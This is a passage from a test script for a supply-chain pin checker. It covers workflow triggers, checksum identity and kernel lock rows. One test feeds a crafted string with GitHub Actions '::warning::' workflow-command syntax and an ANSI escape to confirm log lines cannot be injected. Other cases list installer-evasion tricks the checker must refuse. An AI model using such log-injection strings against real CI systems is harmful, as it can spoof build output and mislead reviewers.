    tgzvar) CASE="go with a second download of a go.tgz URL held in a variable (in base and head alike) is not the pinned install form: FAILS (exit 1)" ;;
    scpvar) CASE="go with an scp of \${gofile} to another host (in base and head alike) is not the pinned install form: FAILS (exit 1)" ;;
    urlgofile) CASE="go with a mirror URL variable built from \${gofile} and a second curl (in base and head alike) is not the pinned install form: FAILS (exit 1)" ;;
    printfv) CASE="go with printf -v \"GO_VER\" is not the pinned install form: FAILS (exit 1)" ;;
    declq) CASE="go with declare \"GO_VER=...\" is not the pinned install form: FAILS (exit 1)" ;;
    rsyncver) CASE="go with an rsync that reads GO_VER (in base and head alike) is not the pinned install form: FAILS (exit 1)" ;;
    shasum) CASE="go with a redefined sha256sum function is not the pinned install form: FAILS (exit 1)" ;;
    cutfn) CASE="go with a redefined cut function is not the pinned install form: FAILS (exit 1)" ;;
    aliasmut) CASE="go with an alias for sha256sum is not the pinned install form: FAILS (exit 1)" ;;
    subshell) CASE="go with the download and verify wrapped in a subshell whose failure is ignored is not the pinned install form: FAILS (exit 1)" ;;
    ifdef) CASE="go with a sha256sum function defined after then is not the pinned install form: FAILS (exit 1)" ;;
    spacedef) CASE="go with a function declared as name ( ) is not the pinned install form: FAILS (exit 1)" ;;
    wrapall) CASE="go with the whole tool dispatch wrapped in a subshell whose failure is ignored is not the pinned install form: FAILS (exit 1)" ;;
    inlinesub) CASE="go with an inline ':; (' subshell around the download is not the pinned install form: FAILS (exit 1)" ;;
  esac
  check test "$rc" -eq 1; check grep -q 'FAIL tool:go@1.27.3' "$work/gomut-$mut.out"
done

CASE="owner rule 1: a changed trigger MOVES a variable placeholder; a changed paths filter does not"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY2'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1])
inv = importlib.util.module_from_spec(spec)
spec.loader.exec_module(inv)
def wf(on, run='docker run --rm "$IMAGE" true', env="alpine:3.20", jobenv="", top=""):
    steps = "    steps:\n      - env:\n          IMAGE: " + env + "\n        run: " + run + "\n"
    return {".github/workflows/a.yml": top + "on:\n" + on + "jobs:\n  j:\n" + jobenv + steps}
base = "  push:\n    branches: [main]\n  pull_request:\n"
def moved(a, b):
    """the placeholder (variable image) itself is among the items the head adds"""
    return [i.key for i in inv.moved(inv.inventory(a), inv.inventory(b)) if "(variable)" in i.key]
def moves(label, a, b): assert moved(a, b), label + ": must move the placeholder"
def still(label, a, b): assert not moved(a, b), label + ": must move nothing"
# a changed paths filter chooses whether a run happens, never what it fetches
still("paths filter added", wf(base), wf(base.replace("pull_request:\n", "pull_request:\n    paths: [bin/**]\n")))
still("paths-ignore changed", wf(base + "    paths-ignore: [a]\n"), wf(base + "    paths-ignore: [b]\n"))
# every other trigger change moves it
moves("merge_group added", wf(base), wf(base + "  merge_group:\n"))
moves("branch filter", wf(base), wf("  push:\n    branches: [main, dev]\n  pull_request:\n"))
moves("types filter", wf(base), wf(base.replace("pull_request:\n", "pull_request:\n    types: [opened]\n")))
moves("event removed", wf(base), wf("  push:\n    branches: [main]\n"))
moves("cron-only change", wf("  schedule:\n    - cron: '0 1 * * *'\n"), wf("  schedule:\n    - cron: '*/5 * * * *'\n"))
ref_run = 'docker run --rm "${{ github.ref_name }}" true'
moves("tags filter read via ref_name",
      wf("  push:\n    tags: ['v1.*']\n", run=ref_run), wf("  push:\n    tags: ['*']\n", run=ref_run))
moves("repository_dispatch added", wf(base), wf(base + "  repository_dispatch:\n    types: [scan]\n"))
call = lambda v, out="a": ("  workflow_call:\n    inputs:\n      image-ref:\n        default: " + v
                           + "\n    outputs:\n      image:\n        value: ${{ jobs.j.outputs." + out + " }}\n")
disp = lambda v: "  workflow_dispatch:\n    inputs:\n      image-ref:\n        default: " + v + "\n"
moves("workflow_call input default", wf(call("a")), wf(call("b")))
moves("workflow_dispatch input default", wf(disp("a")), wf(disp("b")))
moves("workflow_call output mapping", wf(call("a", "a")), wf(call("a", "b")))
# the step's own text, its env value (two tag-only values: the placeholder itself moves), the job env and the
# workflow env still move it
moves("env value", wf(base, env="alpine:3.20"), wf(base, env="alpine:3.21"))
moves("step text", wf(base), wf(base, run='docker run --rm "$IMAGE" false'))
moves("job env", wf(base), wf(base, jobenv="    env:\n      X: y\n"))
moves("workflow env", wf(base, top="env:\n  X: y\n"), wf(base, top="env:\n  X: z\n"))
# a scalar or list `on` is unchanged, and nothing changed moves nothing
still("nothing changed", wf(base), wf(base))
PY2


# --- the checksum is part of an item's identity: a sum-only change under the same version is a moved item (named, and readable, so it passes) ---
A64=$(printf 'a%.0s' $(seq 64)); B64=$(printf 'b%.0s' $(seq 64))
newcase sum-scanner "$(sub bin/install-scanner.sh "SUM=$A64" "SUM=$B64")"
runck sum-scanner
CASE="sum: a checksum change under the SAME tool version is a moved item (named, a readable pin: exit 0)"
check test "$rc" -eq 0; check grep -qF 'tool:trivy@0.74.0' "$work/sum-scanner.out"
newcase sum-req "$(sub .github/pins/adjudicator-requirements.txt '--hash=sha256:aaaa' '--hash=sha256:cccc')"
runck sum-req
CASE="sum: a --hash change under the SAME package version is a moved item"
check test "$rc" -eq 0; check grep -qF 'package:pypi/anthropic@1.9.0' "$work/sum-req.out"
newcase sum-comment "pathlib=__import__('pathlib'); p=pathlib.Path('bin/install-scanner.sh'); p.write_text(p.read_text()+'# a note\n')"
runck sum-comment
CASE="sum: a comment added to the installer script moves nothing"; check test "$rc" -eq 0; check grep -qi 'no pin moved' "$work/sum-comment.out"
# --- literal-download sums and sums across files (identity of an item) -----------------------------------------------------------------
CASE="sum: a literal release download inside an installer arm (crane) carries its arm's sums; changing only that sum is a moved item"
check python3 - "$chk" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
inv = ac.inv
def files(sm):
    return {"bin/install-scanner.sh": '#!/usr/bin/env bash\ncase "${TOOL}:${arch}" in\n  crane:x86_64|crane:amd64) SUM=' + sm + ' ;;\nesac\ncase "$TOOL" in\n  crane)\n    curl -fsSL -o "$tmp/c.tgz" "https://github.com/google/go-containerregistry/releases/download/v0.22.1/go-containerregistry_Linux_x86_64.tar.gz" || pipeline_fail "download failed"\n    ;;\nesac\n'}
a, b = inv.inventory(files("a" * 64)), inv.inventory(files("b" * 64))
assert any("go-containerregistry" in k for k in a), list(a)
assert inv.moved(a, b) and not inv.moved(a, inv.inventory(files("a" * 64)))
PY
CASE="sum: the same package pinned in two requirements files: a hash change in the SECOND file is a moved item"
check python3 - "$chk" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
inv = ac.inv
r = lambda h: "demo==1.2.3 \\\n    --hash=sha256:" + h + "\n"
a = inv.inventory({"a/requirements.txt": r("aa"), "b/requirements.txt": r("bb")})
b = inv.inventory({"a/requirements.txt": r("aa"), "b/requirements.txt": r("cc")})
assert inv.moved(a, b), "a hash change in the second file was hidden by the first"
assert not inv.moved(a, inv.inventory({"a/requirements.txt": r("aa"), "b/requirements.txt": r("bb")}))
PY
CASE="sum: a decoy arm label inside a heredoc (xq) cannot hide the crane arm's sums: with no sums found for a literal download the identity is the whole script, so a sum-only edit is a moved item"
check python3 - "$chk" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
inv = ac.inv
def files(sm, decoy=True):
    d = "    : <<'EOF'\n  xq)\nEOF\n" if decoy else ""
    return {"bin/install-scanner.sh": '#!/usr/bin/env bash\ncase "${TOOL}:${arch}" in\n  crane:x86_64|crane:amd64) SUM=' + sm + ' ;;\nesac\ncase "$TOOL" in\n  crane)\n' + d + '    curl -fsSL -o "$tmp/c.tgz" "https://github.com/google/go-containerregistry/releases/download/v0.22.1/go-containerregistry_Linux_x86_64.tar.gz" || pipeline_fail "download failed"\n    ;;\nesac\n'}
assert inv.moved(inv.inventory(files("a" * 64)), inv.inventory(files("b" * 64))), "a sum-only edit behind a decoy arm label was not seen"
assert not inv.moved(inv.inventory(files("a" * 64)), inv.inventory(files("a" * 64)))
PY
CASE="sum: a download in a multi-label arm (a|b)) or after esac is in no single tool's arm: no foreign sums attach and a sum-only edit of its own row is a moved item (Fable ruling on #639)"
check python3 - "$chk" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
inv = ac.inv
DL = '    curl -fsSL -o "$tmp/c.tgz" "https://github.com/google/go-containerregistry/releases/download/v0.22.1/go-containerregistry_Linux_x86_64.tar.gz" || pipeline_fail "download failed"\n'
HEAD = '#!/usr/bin/env bash\ncase "${TOOL}:${arch}" in\n  foo:amd64) SUM=' + "f" * 64 + ' ;;\n  crane:amd64) SUM=%s ;;\nesac\ncase "$TOOL" in\n  foo)\n    echo foo\n    ;;\n'
def multi(sm):
    return {"bin/install-scanner.sh": HEAD % sm + "  crane|other)\n" + DL + "    ;;\nesac\n"}
def after(sm):
    return {"bin/install-scanner.sh": HEAD % sm + "esac\n" + DL}
for name, mk in (("a|b) arm", multi), ("after esac", after)):
    a, b = inv.inventory(mk("a" * 64)), inv.inventory(mk("b" * 64))
    dl = [it for it in a.values() if "go-containerregistry" in it.name]
    assert dl, (name, list(a))
    assert not any("f" * 64 in it.sums for it in dl), (name, "foreign sums attached", [it.sums for it in dl])
    assert inv.moved(a, b), (name, "a sum-only edit was not a moved item")
    assert not inv.moved(a, inv.inventory(mk("a" * 64))), name
PY
CASE="sum: the same download line in two single-label arms (crane, cosign) with different SUM rows: neither gets the other's sum, and a sum-only edit of the SECOND arm's row is a moved item (round 4 finding)"
check python3 - "$chk" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
inv = ac.inv
DL = '    curl -fsSL -o "$tmp/c.tgz" "https://github.com/google/go-containerregistry/releases/download/v0.22.1/go-containerregistry_Linux_x86_64.tar.gz" || pipeline_fail "download failed"\n'
def files(second):
    return {"bin/install-scanner.sh": '#!/usr/bin/env bash\ncase "${TOOL}:${arch}" in\n  crane:amd64) SUM=' + "a" * 64 + ' ;;\n  cosign:amd64) SUM=' + second + ' ;;\nesac\ncase "$TOOL" in\n  crane)\n' + DL + '    ;;\n  cosign)\n' + DL + '    ;;\nesac\n'}
a, b = inv.inventory(files("b" * 64)), inv.inventory(files("c" * 64))
dl = [it for it in a.values() if "go-containerregistry" in it.name]
assert dl, list(a)
assert not any(it.sums == ["a" * 64] for it in dl), [it.sums for it in dl]      # the first arm's sum is not attached to the second arm's identical line
assert inv.moved(a, b), "a sum-only edit of the second arm was not a moved item"
assert not inv.moved(a, inv.inventory(files("b" * 64)))
PY
CASE="structural closure: an unexpected KeyError/AttributeError/TypeError/IndexError/ValueError while reading the tree ends the scan with exit 2 (cannot run, not a pass)"
newcase struct-guard "$(sub bin/install-scanner.sh 'TRIVY_VER=0.74.0' 'TRIVY_VER=0.75.0')"
check python3 - "$chk" "$work/struct-guard" <<'PY'
import contextlib, importlib.util, io, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
for exc in (AttributeError("x"), KeyError("k"), TypeError("t"), IndexError("i"), ValueError("v")):
    def boom(*a, _e=exc, **k): raise _e
    ac.inv.load_at = boom
    err = io.StringIO()
    with contextlib.redirect_stderr(err), contextlib.redirect_stdout(io.StringIO()):
        rc = ac.main(["--root", sys.argv[2], "--base", "HEAD~1", "--head", "HEAD"])
    assert rc == 2 and "cannot run" in err.getvalue(), (exc, rc, err.getvalue()[:200])
PY
CASE="scan (error lines): an error that carries a path with newlines is one line"
check python3 - "$chk" "$here/../../.." <<'PY'
import contextlib, importlib.util, io, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1])
ac = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ac)
root = sys.argv[2]
EVIL = "a\n::warning::x\n\x1b[31m##[warning]y/requirements.txt is too large to read safely"
def boom(*a, **k):
    raise RuntimeError(EVIL)
ac.inv.load_at = boom      # the tree read: its error carries a path of the pull request
err = io.StringIO()
with contextlib.redirect_stderr(err), contextlib.redirect_stdout(io.StringIO()):
    rc = ac.main(["--root", root, "--base", "HEAD", "--head", "HEAD"])
lines = err.getvalue().split("\n")
assert rc == 2 and len(lines) == 2 and lines[1] == "" and not any(l.startswith("::") for l in lines), (rc, err.getvalue())
assert "::warning::x" in lines[0] and "too large to read safely" in lines[0], err.getvalue()
assert "\x1b" not in lines[0] and "##[" not in lines[0], err.getvalue()
PY
# --- the kernel lock rows are in the inventory: a moved row is named like any other pin (REQ-SUP-001-AC2) ----------------------------------------
# The aged file is build/locks/vm-kernel.lock (the constant KERNEL_LOCK in pin-inventory.py): one row per line, "<name>=<version> sha256:<64 hex>", the name
# may carry an "<arch>/" prefix; blank lines and "#" lines are ignored. An item is kind "apk", key "apk:<name>@<version>", and the row's sha256 is its sum, so
# the same version with a new sha256 is a NEW item. The Wolfi lock files and build/archive.json are NOT listed, on purpose (cases f, g).
# The row format is read by ONE function of pin-inventory.py; if the real file differs, only that function and the row helpers below change.
H1=$(printf '1%.0s' $(seq 64)); H2=$(printf '2%.0s' $(seq 64)); H3=$(printf '3%.0s' $(seq 64)); H4=$(printf '4%.0s' $(seq 64))
rowx1="x86_64/linux-virt=6.18.60-r0 sha256:$H1"; rowx2="x86_64/linux-virt=6.18.61-r0 sha256:$H2"
rowa1="aarch64/linux-virt=6.18.60-r0 sha256:$H3"; rowa2="aarch64/linux-virt=6.18.61-r0 sha256:$H4"
rowx1b="x86_64/linux-virt=6.18.60-r0 sha256:$H2"       # the same version as rowx1, a different apk
KX2="apk:x86_64/linux-virt@6.18.61-r0"; KA2="apk:aarch64/linux-virt@6.18.61-r0"; KX1="apk:x86_64/linux-virt@6.18.60-r0"
# lcase NAME PATH [python edit run in the repo for the head commit]: a copy of the base repository whose base commit holds $work/NAME.b at PATH (when that
# file exists) and whose head commit holds $work/NAME.h at PATH (when that file exists), then the optional edit.
lcase() {
  local n=$1 p=$2
  rm -rf "${work:?}/${n:?}"; cp -R "$base" "$work/$n"
  ( cd "$work/$n"
    mkdir -p "$(dirname "$p")"
    if [ -f "$work/$n.b" ]; then cp "$work/$n.b" "$p"; fi
    git add -A; git -c user.name=t -c user.email=t@x commit -q --allow-empty -m base2
    if [ -f "$work/$n.h" ]; then cp "$work/$n.h" "$p"; fi
    if [ -n "${3:-}" ]; then python3 -c "$3"; fi
    git add -A; git -c user.name=t -c user.email=t@x commit -q --allow-empty -m head )
}
K=build/locks/vm-kernel.lock
printf '%s\n' "$rowx1" >"$work/lca.b";  printf '%s\n' "$rowx2" >"$work/lca.h";  lcase lca "$K"
printf '%s\n' "$rowx1" >"$work/lcc.b";  cp "$work/lcc.b" "$work/lcc.h";         lcase lcc "$K" "import pathlib; pathlib.Path('README.md').write_text('hi')"
printf '%s\n%s\n' "$rowx1" "$rowa1" >"$work/lcd.b"; printf '%s\n%s\n' "$rowx2" "$rowa2" >"$work/lcd.h"; lcase lcd "$K"
printf '%s\n' "$rowx1" >"$work/lce.b";  printf '%s\n' "$rowx1b" >"$work/lce.h"; lcase lce "$K"
printf 'bubblewrap=0.13.1-r0 sha256:%s\n' "$H1" >"$work/lcf.b"; printf 'bubblewrap=0.13.2-r0 sha256:%s\n' "$H2" >"$work/lcf.h"; lcase lcf build/locks/host-tools.lock
printf '{"schema": 1, "artifact": "x@sha256:%s", "files": []}\n' "$H1" >"$work/lcg.b"; printf '{"schema": 1, "artifact": "x@sha256:%s", "files": []}\n' "$H2" >"$work/lcg.h"; lcase lcg build/archive.json
printf '%s\n%s\n' "$rowx1" "$rowa1" >"$work/lch.b"; printf '# the kernel rows, edited\n\n%s\n\n%s\n\n' "$rowa1" "$rowx1" >"$work/lch.h"; lcase lch "$K"
printf '%s\n%s\n' "$rowx1" "$rowa1" >"$work/lci.b"; printf '%s\n' "$rowx1" >"$work/lci.h"; lcase lci "$K"
printf '%s\n' "$rowx1" >"$work/lcj.b";  printf '%s\n' "$rowx2" >"$work/lcj.h";  lcase lcj "$K"
# case g needs the kernel file present in BOTH commits (so only build/archive.json moves): add it to the base commit and the head commit of lcg
( cd "$work/lcg"; git checkout -q HEAD~1; mkdir -p build/locks; printf '%s\n' "$rowx1" >"$K"; git add -A; git -c user.name=t -c user.email=t@x commit -q -m base3
  cp "$work/lcg.h" build/archive.json; git add -A; git -c user.name=t -c user.email=t@x commit -q -m head2; git checkout -q -B master )

LCHK=$chk; LINV=$here/../supply-chain/pin-inventory.py
# lrun NAME -> rc, $work/NAME.out, $work/NAME.json with the checker $LCHK
lrun() {
  rc=0
  python3 "$LCHK" --root "$work/$1" --base HEAD~1 --head HEAD --json "$work/$1.json" >"$work/$1.out" 2>&1 || rc=$?
}
lc_a() { lrun lca; test "$rc" -eq 0 && grep -q "$KX2" "$work/lca.out"; }
lc_c() { lrun lcc; test "$rc" -eq 0 && ! grep -q 'apk:' "$work/lcc.out"; }
lc_d() { lrun lcd; test "$rc" -eq 0 && grep -q "$KX2" "$work/lcd.out" && grep -q "$KA2" "$work/lcd.out"; }
lc_e() { lrun lce; test "$rc" -eq 0 && grep -q "$KX1" "$work/lce.out"; }
lc_f() { lrun lcf; test "$rc" -eq 0 && ! grep -q 'apk:' "$work/lcf.out"; }
lc_g() { lrun lcg; test "$rc" -eq 0 && ! grep -q 'apk:' "$work/lcg.out"; }
lc_h() { lrun lch; test "$rc" -eq 0 && ! grep -q 'apk:' "$work/lch.out"; }
lc_h2() { lrun lci; test "$rc" -eq 0 && ! grep -q 'apk:' "$work/lci.out"; }
lc_u() {   # the inventory itself lists the row: kind apk, key, a sum that follows the apk's sha256
  python3 -I - "$LINV" "$work/lce" "$work/lca" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("pin_inventory", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
def apks(root, rev):
    return {k: v for k, v in inv.load_at(root, rev).items() if k.startswith("apk:")}
a_base, a_head = apks(sys.argv[2], "HEAD~1"), apks(sys.argv[2], "HEAD")
key = "apk:x86_64/linux-virt@6.18.60-r0"
assert list(a_base) == [key] and list(a_head) == [key], (a_base, a_head)
it = a_head[key]
assert it.kind == "apk" and it.name == "x86_64/linux-virt" and it.version == "6.18.60-r0", (it.kind, it.name, it.version)
assert a_base[key].sum and it.sum and a_base[key].sum != it.sum, "the same version with another sha256 must have another sum"
two = apks(sys.argv[3], "HEAD")
assert list(two) == ["apk:x86_64/linux-virt@6.18.61-r0"], two
PY
}
# --- round 1 (seats A, B, D): the reader refuses what it cannot read, and the rows are judged like every other pin (G1 to G10) ------------------
HXL=$(printf 'abcdef01%.0s' $(seq 8)); HXU=$(printf '%s' "$HXL" | tr a-f A-F); H63=${H1:0:63}; H65="${H1}a"
cat >"$work/lw.py" <<'PY'
import os, pathlib
K = "build/locks/vm-kernel.lock"
def _clear(p):
    if os.path.islink(p) or os.path.exists(p):
        os.unlink(p)
def w(text, path=K):
    p = pathlib.Path(path); p.parent.mkdir(parents=True, exist_ok=True); _clear(p)
    p.write_bytes(text if isinstance(text, bytes) else text.encode())
def link(target, path=K):
    p = pathlib.Path(path); p.parent.mkdir(parents=True, exist_ok=True); _clear(p); os.symlink(target, p)
def rm(path=K):
    _clear(path)
PY
pyi() { printf "import sys; sys.path.insert(0, '%s'); from lw import *; %s" "$work" "$1"; }
# lcase2 NAME 'python for the base commit' 'python for the head commit' (helpers w(text[,path]), link(target[,path]), rm([path]) from $work/lw.py)
lcase2() {
  local n=$1
  rm -rf "${work:?}/${n:?}"; cp -R "$base" "$work/$n"
  ( cd "$work/$n"
    python3 -c "$(pyi "$2")"; git add -A; git -c user.name=t -c user.email=t@x commit -q --allow-empty -m base2
    python3 -c "$(pyi "$3")"; git add -A; git -c user.name=t -c user.email=t@x commit -q --allow-empty -m head )
}
RM="pathlib.Path('README.md').write_text('hi')"
# G1: the lock path is a symlink: refused (exit 2), the target's name is never parsed
lcase2 lg1a "w('$rowx1\n')" "link('elsewhere.txt')"
lcase2 lg1b "w('$rowx1\n')" "link('x86_64/linux-virt=6.18.62-r0 sha256:$H4')"          # the link's TARGET text is itself a valid row
lcase2 lg1c "w('$rowx1\n')" "w('$rowx2\n', 'build/locks/real.lock'); link('real.lock')"   # a link to a real file holding a valid row
lcase2 lg1w "w('$rowx1\n')" "$RM"
( cd "$work/lg1w" && printf '%s\n' "$rowx2" >build/locks/real.lock && python3 -c "$(pyi "link('real.lock')")" )   # the symlink exists only in the working tree
# G2: the same name=version twice
lcase2 lg2a "w('$rowx1\n')" "w('$rowx2\nx86_64/linux-virt=6.18.61-r0 sha256:$H3\n')"
lcase2 lg2b "w('$rowx1\n')" "w('x86_64/linux-virt=6.18.61-r0 sha256:$H3\n$rowx2\n')"
lcase2 lg2c "w('$rowx1\n')" "w('$rowx2\n$rowx2\n')"
# G3: the file exists and holds no row
lcase2 lg3a "w('$rowx1\n')" "w('')"
lcase2 lg3b "w('$rowx1\n')" "w('# only a comment\n')"
lcase2 lg3c "w('$rowx1\n')" "w('\n\n   \n')"
lcase2 lg3d "pass" "w('')"
lcase2 lg3e "pass" "$RM"
lcase2 lg3f "w('$rowx1\n')" "rm()"
# G4: the row cache#840 wrote (no arch prefix)
line4="linux-virt=6.18.60-r0 sha256:3ff658cf5aada14687238527f48526cef7a75ac8c673fc597f3a65791c86a25e"
lcase2 lg4 "pass" "w('$line4\n')"
# G5: a row that cannot be read stops the check (exit 2), whatever else the file holds
g5() { local id=$1 content=$2; lcase2 "lg5_$id" "w('$rowx1\n')" "w($content)"
  eval "lc_g5_$id() { lrun lg5_$id; test \"\$rc\" -eq 2 && grep -q 'cannot run' \"\$work/lg5_$id.out\" && grep -q 'vm-kernel.lock' \"\$work/lg5_$id.out\"; }"; G5IDS="$G5IDS g5_$id"; }
G5IDS=""
g5 hex63  "'$rowx2\nx86_64/linux-virt=6.18.62-r0 sha256:$H63\n'"
g5 hex65  "'$rowx2\nx86_64/linux-virt=6.18.62-r0 sha256:$H65\n'"
g5 nosum  "'$rowx2\nx86_64/linux-virt=6.18.62-r0\n'"
g5 upper  "'$rowx2\nx86_64/linux-virt=6.18.62-r0 sha256:$HXU\n'"
g5 eq2    "'$rowx2\nx86_64/linux-virt=6.18.62=r0 sha256:$H1\n'"
g5 junk   "'$rowx2\nthis is not a row\n'"
g5 nul    "b'$rowx2\nx86_64/linux-virt=6.18.62-r0\x00 sha256:$H1\n'"
g5 tail   "'$rowx2\nx86_64/linux-virt=6.18.62-r0 sha256:$H1 # note\n'"
# G6: apk versions the row grammar takes, is_pin takes too
lcase2 lg6 "pass" "w('x86_64/openssl=1.1.1w-r0 sha256:$H1\nx86_64/tzdata=2023c-r0 sha256:$H2\n')"
# G8: a tracked kernel lock that cannot be read in the working tree
lcase2 lg8 "w('$rowx1\n')" "$RM"
( cd "$work/lg8" && rm -f build/locks/vm-kernel.lock && mkdir build/locks/vm-kernel.lock )      # tracked path, a directory now: opening it fails like an unreadable file would
# G9: the row cap is 500
rows500=$(python3 -c "import hashlib; print(''.join('pkg%04d=1.0-r0 sha256:%s\n' % (i, hashlib.sha256(str(i).encode()).hexdigest()) for i in range(500)))")
rows501=$(python3 -c "import hashlib; print(''.join('pkg%04d=1.0-r0 sha256:%s\n' % (i, hashlib.sha256(str(i).encode()).hexdigest()) for i in range(501)))")
printf '%s' "$rows500" >"$work/rows500.txt"; printf '%s' "$rows501" >"$work/rows501.txt"
lcase2 lg9a "w(open('$work/rows500.txt').read())" "w(open('$work/rows500.txt').read()); $RM"
lcase2 lg9b "w(open('$work/rows501.txt').read())" "w(open('$work/rows501.txt').read()); $RM"

lc_g1a() { lrun lg1a; test "$rc" -eq 2 && grep -q 'cannot run' "$work/lg1a.out"; }
lc_g1b() { lrun lg1b; test "$rc" -eq 2 && grep -q 'cannot run' "$work/lg1b.out"; }
lc_g1c() { lrun lg1c; test "$rc" -eq 2 && grep -q 'cannot run' "$work/lg1c.out"; }
lc_g1w() {   # the working-tree path (rev None): a symlinked kernel lock is refused by tree_files and by load_at
  python3 -I - "$LINV" "$work/lg1w" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("pin_inventory", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
for fn in (lambda: inv.tree_files(sys.argv[2], None), lambda: inv.load_at(sys.argv[2], None)):
    try:
        fn()
    except RuntimeError as e:
        assert "vm-kernel.lock" in str(e), str(e)
    else:
        raise AssertionError("a symlinked kernel lock in the working tree was read")
PY
}
lc_g2a() { lrun lg2a; test "$rc" -eq 2 && grep -q 'cannot run' "$work/lg2a.out"; }
lc_g2b() { lrun lg2b; test "$rc" -eq 2 && grep -q 'cannot run' "$work/lg2b.out"; }
lc_g2c() { lrun lg2c; test "$rc" -eq 2 && grep -q 'cannot run' "$work/lg2c.out"; }     # decision: two IDENTICAL rows are an error too
lc_g3a() { lrun lg3a; test "$rc" -eq 2 && grep -q 'cannot run' "$work/lg3a.out"; }
lc_g3b() { lrun lg3b; test "$rc" -eq 2 && grep -q 'cannot run' "$work/lg3b.out"; }
lc_g3c() { lrun lg3c; test "$rc" -eq 2 && grep -q 'cannot run' "$work/lg3c.out"; }
lc_g3d() { lrun lg3d; test "$rc" -eq 2 && grep -q 'cannot run' "$work/lg3d.out"; }
lc_g3e() { lrun lg3e; test "$rc" -eq 0 && grep -qi 'no pin moved' "$work/lg3e.out"; }            # a missing file stays allowed
lc_g3f() { lrun lg3f; test "$rc" -eq 0 && ! grep -q 'apk:' "$work/lg3f.out"; }                   # so does a file that is removed
lc_g4a() { lrun lg4; test "$rc" -eq 0 && grep -q 'apk:linux-virt@6.18.60-r0' "$work/lg4.out"; }
lc_g4u() {
  python3 -I - "$LINV" "$work/lg4" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("pin_inventory", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
it = inv.load_at(sys.argv[2], "HEAD").get("apk:linux-virt@6.18.60-r0")
assert it is not None and it.kind == "apk" and it.name == "linux-virt" and it.version == "6.18.60-r0" and it.sum, it
PY
}
lc_g6a() {
  lrun lg6
  test "$rc" -eq 0 && grep -q 'apk:x86_64/openssl@1.1.1w-r0' "$work/lg6.out" && grep -q 'apk:x86_64/tzdata@2023c-r0' "$work/lg6.out" && ! grep -qi 'not a pin' "$work/lg6.out"
}
lc_g6u() {
  python3 -I - "$LCHK" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("pac", sys.argv[1]); pac = importlib.util.module_from_spec(spec); spec.loader.exec_module(pac)
for v in ("1.1.1w-r0", "2023c-r0", "6.18.60-r0", "20260909-r3", "0.13.1-r0", "1.0b-r0"):
    assert pac.is_pin(v), v
for v in ("main", "latest", "1.*", "3.x", ">=1.2", "~1.2.3", "nightly", "", "1.2.3 || 2.0", "3x", "1x", "2.x-r0"):
    assert not pac.is_pin(v), v
PY
}
lc_g8() {   # the working-tree read of the kernel lock fails: tree_files RAISES (as for PERSONA_TOOLS), it does not skip the file
  python3 -I - "$LINV" "$work/lg8" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("pin_inventory", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
try:
    inv.tree_files(sys.argv[2], None)
except RuntimeError as e:
    assert "vm-kernel.lock" in str(e), str(e)
else:
    raise AssertionError("an unreadable kernel lock was skipped")
PY
}
lc_g9a() { lrun lg9a; test "$rc" -eq 0 && grep -qi 'no pin moved' "$work/lg9a.out"; }          # exactly 500 rows are accepted
lc_g9b() { lrun lg9b; test "$rc" -eq 2 && grep -q 'cannot run' "$work/lg9b.out"; }              # 501 are refused
lc_g10a() { python3 -I - "$LINV" <<'PY'
import sys
head = "".join(open(sys.argv[1]).readlines()[:14])
assert "apk" in head, "the item-kind list in the header of pin-inventory.py does not name apk"
PY
}
lc_g10b() { python3 -I - "$here/pin-age-check-test.sh" <<'PY'
import sys
head = "".join(open(sys.argv[1]).readlines()[:16])
assert "apk" in head, "the header of pin-age-check-test.sh does not name apk"
PY
}
# --- round 2 (seat A): the ROW parser refuses a version that is not a pin, also when the row did not change ------------------------------------
# A row whose version is main, 3x, 1x, latest or x is read by the row grammar but is no pin; if it sits unchanged in base and head nothing "moves" and the check
# would pass with it in the file. The parser itself must refuse it (exit 2, "not a pin"), changed or not.
rp() {   # ID VERSION
  local id=$1 ver=$2
  lcase2 "lrp_$id" "w('$rowx1\n')" "w('$rowx1\nx86_64/badver=$ver sha256:$H3\n')"      # the bad row is NEW in the head
  lcase2 "lru_$id" "w('$rowx1\nx86_64/badver=$ver sha256:$H3\n')" "$RM"                # the bad row is in BOTH commits: the hole
  eval "lc_rp_$id() { lrun lrp_$id; test \"\$rc\" -eq 2 && grep -q 'cannot run' \"\$work/lrp_$id.out\" && grep -qi 'not a pin' \"\$work/lrp_$id.out\" && grep -q 'vm-kernel.lock' \"\$work/lrp_$id.out\"; }"
  eval "lc_ru_$id() { lrun lru_$id; test \"\$rc\" -eq 2 && grep -q 'cannot run' \"\$work/lru_$id.out\" && grep -qi 'not a pin' \"\$work/lru_$id.out\"; }"
  RPIDS="$RPIDS rp_$id ru_$id"
}
RPIDS=""
rp main main; rp 3x 3x; rp 1x 1x; rp latest latest; rp x x
lc_rv() {   # the row parser itself: bad versions raise RuntimeError naming the file and saying "not a pin"; good ones become apk items
  python3 -I - "$LINV" <<'PY'
